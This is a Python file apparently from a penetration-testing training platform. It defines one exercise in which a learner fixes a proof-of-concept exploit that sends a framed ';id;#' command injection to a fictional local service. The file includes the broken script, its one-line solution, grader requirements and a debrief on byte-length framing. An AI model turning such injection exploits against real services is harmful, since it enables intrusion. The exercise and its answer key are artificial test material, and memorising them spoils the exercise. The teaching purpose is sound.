"""salvage defect class 6: length arithmetic that is off by a known amount.

The buffer overflow left the exam; counting bytes correctly did not. Anything
with a length prefix, an offset, a chunk header or a fixed-width field has the
same failure mode, and the modern form of it in Python is the one here:
**`len()` on a `str` counts characters, `len()` on `bytes` counts bytes**, and
they stop agreeing the moment a payload contains anything outside ASCII.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# wexler-sync 2.0 - framed IMPORT command injection
# Frame is a 4-byte big-endian length followed by that many bytes.
# Commands are terminated with '#'.
import socket
import struct

HOST = "127.0.0.1"
PORT = {{PORT}}

COMMAND = "IMPORT /var/lib/wexler/jobs»;id;#"

def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    print("[*] banner: " + s.recv(64).decode().strip())

    body = COMMAND.encode()
    header = struct.pack(">I", len(COMMAND))
    s.sendall(header + body)

    reply = s.recv(256).decode().strip()
    print("[*] reply: " + reply)
    s.close()
    print("[+] landed" if "CRUX-LANDED" in reply else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace('struct.pack(">I", len(COMMAND))',
                          'struct.pack(">I", len(body))')

SCENARIOS = [
    Scenario(
        id='salvage-framing', track='salvage', tier='verified', order=60,
        title='The frame is one byte short',
        waypoint='svc-db', hone=('python',),
        source='PEN-200 Playbook/05 - Phase 4b - Initial Foothold (Services).md',
        body=SalvageBody(
            brief='`wexler-sync 2.0` replaced the line protocol with frames: '
                  'a **four-byte big-endian length**, then exactly that many '
                  'bytes. A command is only executed when it arrives '
                  'terminated with `#`. The proof-of-concept connects, sends, '
                  'and is refused.',
            filename='wexler_frame.py',
            cve='CVE-2017-0144', models='SMBv1 "EternalBlue"',
            real_note=(
                'EternalBlue is the archetype: its SMB packets are '
                'length-prefixed and offset-sensitive, and a byte count wrong '
                'by one is a crashed host instead of a shell.'
            ),
            defects=('length counted over the str, not the encoded bytes',),
            kind='tcp', framing='length',
            banner=b'wexler-sync 2.0 framed\n',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('an IMPORT command', 'raw', 'IMPORT ',
                            hint='no IMPORT command arrived in a complete '
                                 'frame'),
                Requirement('the injection', 'raw', ';id',
                            hint='the command arrived without the injected '
                                 'part'),
                Requirement('a terminated command', 'raw', ';id;#',
                            hint='the command arrived but the terminator did '
                                 'not, so the daemon never ran it. Count what '
                                 'you are sending, not what you wrote'),
            ),
            debrief='The payload contains one non-ASCII character, so it is '
                    'one byte longer encoded than it is long written. The '
                    'header promised the character count, the daemon read '
                    'that many bytes, and the last byte of the command, the '
                    'terminator, was left in the socket. **Length prefixes '
                    'are counted over what goes on the wire.** In Python 3 '
                    'that means `len(payload.encode())`, never '
                    '`len(payload)`, and the bug is invisible until a payload '
                    'contains a character you did not think about.',
        ),
    ),
]
